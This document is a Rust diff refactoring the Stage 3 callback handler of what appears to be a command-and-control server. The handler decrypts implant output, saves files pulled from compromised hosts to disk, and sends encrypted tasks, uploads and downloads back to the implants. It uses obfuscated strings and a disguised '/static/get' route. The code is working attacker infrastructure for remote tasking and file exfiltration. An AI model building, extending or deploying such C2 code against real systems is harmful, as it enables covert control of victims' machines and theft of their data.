@@ -290,13 +290,171 @@ mod tests {
     }
 }
 
+// ── Stage 3 helpers ─────────────────────────────────────────────────────────
+
+/// Décrypte le payload du body (nouveau format chiffré ou legacy plaintext).
+/// Retourne `(q, tasking)` déchiffrés.
+fn decode_callback(body: &CallbackRequest, key: &[u8; 32]) -> (String, String) {
+    if let Some(encrypted_data) = &body.data {
+        if let Some(decrypted) = decrypt(encrypted_data, key) {
+            #[derive(Deserialize)]
+            struct PayloadData {
+                q: String,
+                tasking: String,
+            }
+            if let Ok(p) = serde_json::from_str::<PayloadData>(&decrypted) {
+                return (p.q, p.tasking);
+            }
+        }
+        (String::new(), String::new())
+    } else {
+        // Legacy format (backward compatibility)
+        (body.q.clone(), body.tasking.clone())
+    }
+}
+
+/// Lock 2 (conditionnel) : traite la sortie d'une tâche complétée.
+///
+/// Retourne `Some((link_name, cli_cmd, display_output))` si quelque chose est à afficher,
+/// `None` si le poll est vide ou si le task_id est invalide.
+/// Le lock est acquis puis relâché avant tout I/O (écriture fichier).
+fn process_callback(
+    links: &Arc<Mutex<Links>>,
+    link_id: Uuid,
+    q: &str,
+    tasking: &str,
+) -> Option<(String, String, String)> {
+    let task_id = Uuid::parse_str(tasking).ok()?;
+    if q.is_empty() {
+        return None;
+    }
+
+    let mut guard = links.lock().unwrap_or_else(|e| e.into_inner());
+
+    let (link_name, cli_cmd) = guard
+        .get_link(link_id)
+        .map(|l| {
+            let cmd = l
+                .tasks
+                .iter()
+                .find(|t| t.id == task_id)
+                .map(|t| t.cli_command.clone())
+                .unwrap_or_default();
+            (l.name.clone(), cmd)
+        })
+        .unwrap_or_else(|| ("unknown".into(), String::new()));
+
+    let is_download = cli_cmd.starts_with("download ");
+
+    let ui_msg = if is_download && q.starts_with("FILE:") {
+        if let Some((file_path, file_content)) = parse_file_response(q) {
+            let display_msg = match save_download(&link_name, &file_path, &file_content) {
+                Ok(dest) => {
+                    let msg = format!("[+] File saved to {}", dest.display());
+                    if let Some(link) = guard.get_link_mut(link_id) {
+                        if let Some(task) = link.tasks.iter_mut().find(|t| t.id == task_id) {
+                            task.file_name = Some(file_path.clone());
+                            task.output = msg.clone();
+                        }
+                    }
+                    msg
+                }
+                Err(e) => e,
+            };
+            Some((link_name.clone(), cli_cmd.clone(), display_msg))
+        } else {
+            None
+        }
+    } else {
+        Some((link_name.clone(), cli_cmd.clone(), q.to_string()))
+    };
+
+    // Pour les downloads, stocker le message user-friendly plutôt que le blob FILE:path:base64.
+    let complete_output = if is_download {
+        ui_msg
+            .as_ref()
+            .map(|(_, _, msg)| msg.clone())
+            .unwrap_or_else(|| q.to_string())
+    } else {
+        q.to_string()
+    };
+    guard.complete_task(link_id, task_id, complete_output);
+    // Marquer affichée : routes.rs l'imprime en temps réel, ce qui évite
+    // le double affichage dans show_completed_task_results() (cli.rs).
+    if let Some(link) = guard.get_link_mut(link_id) {
+        if let Some(task) = link.tasks.iter_mut().find(|t| t.id == task_id) {
+            task.displayed = true;
+        }
+    }
+
+    ui_msg
+}
+
+/// Lock 3 : rotation du x_request_id + dispatch de la prochaine tâche.
+/// Retourne la `TaskResponse` chiffrée à envoyer à l'implant.
+fn build_task_response(
+    links: &Arc<Mutex<Links>>,
+    link_id: Uuid,
+    key: &[u8; 32],
+    new_x_req_id: Uuid,
+) -> TaskResponse {
+    #[derive(Serialize)]
+    struct ResponsePayload {
+        q: String,
+        tasking: String,
+        file: Option<String>,
+        filename: Option<String>,
+        upload: Option<String>,
+        upload_path: Option<String>,
+    }
+
+    let (q, tasking, file, filename, upload, upload_path) = {
+        let mut guard = links.lock().unwrap_or_else(|e| e.into_inner());
+        guard.update_checkin(link_id, new_x_req_id);
+        guard
+            .get_next_task(link_id)
+            .map(|d| {
+                (
+                    d.command,
+                    d.task_id,
+                    d.file_content,
+                    d.file_name,
+                    d.upload_content,
+                    d.upload_path,
+                )
+            })
+            .unwrap_or_default()
+    };
+
+    let payload_json = serde_json::to_string(&ResponsePayload {
+        q,
+        tasking,
+        file,
+        filename,
+        upload,
+        upload_path,
+    })
+    .unwrap_or_else(|_| "{}".to_string());
+
+    TaskResponse {
+        data: Some(encrypt(&payload_json, key)),
+        x_request_id: new_x_req_id.to_string(),
+        q: String::new(),
+        tasking: String::new(),
+        file: None,
+        filename: None,
+        upload: None,
+        upload_path: None,
+    }
+}
+
 /// POST /static/get – Stage 3: task polling / output callback.
 ///
-/// Lock strategy (0.5.7): 3 Mutex acquisitions max par requête.
+/// Lock strategy: 3 Mutex acquisitions max par requête.
 ///  • Lock 1 : résoudre link_id depuis x-request-id + récupérer le secret.
-///  • Lock 2 (conditionnel) : traiter l'output, complete_task, marquer displayed.
+///  • Lock 2 (conditionnel) : traiter l'output via process_callback().
 ///    L'affichage UI se fait HORS du verrou.
-///  • Lock 3 : rotation x_request_id + dispatch prochaine tâche.
+///  • Lock 3 : rotation x_request_id + dispatch prochaine tâche via build_task_response().
 pub async fn stage3_handler(
     req: HttpRequest,
     body: web::Json<CallbackRequest>,
@@ -328,113 +486,12 @@ pub async fn stage3_handler(
     let key = derive_key(secret.as_bytes(), obfstr!("callback-salt"));
 
     // ── Lock 2 (conditional): process callback output ────────────────────────
-    // Collect info needed for UI printing; the lock is released before any I/O.
-    let ui_message: Option<(String, String, String)>; // (link_name, cli_cmd, display_output)
-
-    // Decrypt payload if present (new format), otherwise use legacy fields
-    let decrypted_q: String;
-    let decrypted_tasking: String;
-
-    if let Some(encrypted_data) = &body.data {
-        // New encrypted format
-        if let Some(decrypted) = decrypt(encrypted_data, &key) {
-            // Parse the decrypted JSON payload
-            #[derive(Deserialize)]
-            struct PayloadData {
-                q: String,
-                tasking: String,
-            }
-            if let Ok(payload) = serde_json::from_str::<PayloadData>(&decrypted) {
-                decrypted_q = payload.q;
-                decrypted_tasking = payload.tasking;
-            } else {
-                decrypted_q = String::new();
-                decrypted_tasking = String::new();
-            }
-        } else {
-            decrypted_q = String::new();
-            decrypted_tasking = String::new();
-        }
+    let (decrypted_q, decrypted_tasking) = decode_callback(&body, &key);
+    let ui_message = if !decrypted_tasking.is_empty() {
+        process_callback(&data.links, link_id, &decrypted_q, &decrypted_tasking)
     } else {
-        // Legacy format (backward compatibility)
-        decrypted_q = body.q.clone();
-        decrypted_tasking = body.tasking.clone();
-    }
-
-    if !decrypted_tasking.is_empty() {
-        if let Ok(task_id) = Uuid::parse_str(&decrypted_tasking) {
-            if !decrypted_q.is_empty() {
-                let mut links = data.links.lock().unwrap_or_else(|e| e.into_inner());
-
-                let (link_name, cli_cmd) = links
-                    .get_link(link_id)
-                    .map(|l| {
-                        let cmd = l
-                            .tasks
-                            .iter()
-                            .find(|t| t.id == task_id)
-                            .map(|t| t.cli_command.clone())
-                            .unwrap_or_default();
-                        (l.name.clone(), cmd)
-                    })
-                    .unwrap_or_else(|| ("unknown".into(), String::new()));
-
-                let is_download = cli_cmd.starts_with("download ");
-
-                if is_download && decrypted_q.starts_with("FILE:") {
-                    // Save the file to disk; store path in task output.
-                    if let Some((file_path, file_content)) = parse_file_response(&decrypted_q) {
-                        let display_msg = match save_download(&link_name, &file_path, &file_content)
-                        {
-                            Ok(dest) => {
-                                let msg = format!("[+] File saved to {}", dest.display());
-                                if let Some(link) = links.get_link_mut(link_id) {
-                                    if let Some(task) =
-                                        link.tasks.iter_mut().find(|t| t.id == task_id)
-                                    {
-                                        task.file_name = Some(file_path.clone());
-                                        task.output = msg.clone();
-                                    }
-                                }
-                                msg
-                            }
-                            Err(e) => e,
-                        };
-                        ui_message = Some((link_name, cli_cmd, display_msg));
-                    } else {
-                        ui_message = None;
-                    }
-                } else {
-                    ui_message = Some((link_name, cli_cmd, decrypted_q.clone()));
-                }
-
-                // Pour les downloads, préserver le message user-friendly
-                // plutôt que le blob brut FILE:path:base64
-                let complete_output = if is_download {
-                    ui_message
-                        .as_ref()
-                        .map(|(_, _, msg)| msg.clone())
-                        .unwrap_or_else(|| decrypted_q.clone())
-                } else {
-                    decrypted_q.clone()
-                };
-                links.complete_task(link_id, task_id, complete_output);
-                // Marquer affichée : routes.rs l'imprime en temps réel,
-                // ce qui évite le double affichage dans show_completed_task_results() (cli.rs).
-                if let Some(link) = links.get_link_mut(link_id) {
-                    if let Some(task) = link.tasks.iter_mut().find(|t| t.id == task_id) {
-                        task.displayed = true;
-                    }
-                }
-            } else {
-                ui_message = None;
-            }
-        } else {
-            ui_message = None;
-        }
-    } else {
-        ui_message = None;
-    }
+        None
+    };
 
     // Print to console outside the lock.
     if let Some((link_name, cli_cmd, output)) = ui_message {
@@ -457,57 +514,10 @@ pub async fn stage3_handler(
 
     // ── Lock 3: rotate request ID + dispatch next task ───────────────────────
     let new_x_req_id = Uuid::new_v4();
-    let (q, tasking, file, filename, upload, upload_path) = {
-        let mut links = data.links.lock().unwrap_or_else(|e| e.into_inner());
-        links.update_checkin(link_id, new_x_req_id);
-        links
-            .get_next_task(link_id)
-            .map(|d| {
-                (
-                    d.command,
-                    d.task_id,
-                    d.file_content,
-                    d.file_name,
-                    d.upload_content,
-                    d.upload_path,
-                )
-            })
-            .unwrap_or_default()
-    };
-
-    // Build response payload
-    #[derive(Serialize)]
-    struct ResponsePayload {
-        q: String,
-        tasking: String,
-        file: Option<String>,
-        filename: Option<String>,
-        upload: Option<String>,
-        upload_path: Option<String>,
-    }
-
-    let payload = ResponsePayload {
-        q,
-        tasking,
-        file,
-        filename,
-        upload,
-        upload_path,
-    };
-
-    let payload_json = serde_json::to_string(&payload).unwrap_or_else(|_| "{}".to_string());
-    let encrypted_data = encrypt(&payload_json, &key);
-
-    let resp = TaskResponse {
-        data: Some(encrypted_data),
-        x_request_id: new_x_req_id.to_string(),
-        q: String::new(),
-        tasking: String::new(),
-        file: None,
-        filename: None,
-        upload: None,
-        upload_path: None,
-    };
-
-    HttpResponse::Ok().json(resp)
+    HttpResponse::Ok().json(build_task_response(
+        &data.links,
+        link_id,
+        &key,
+        new_x_req_id,
+    ))
 }
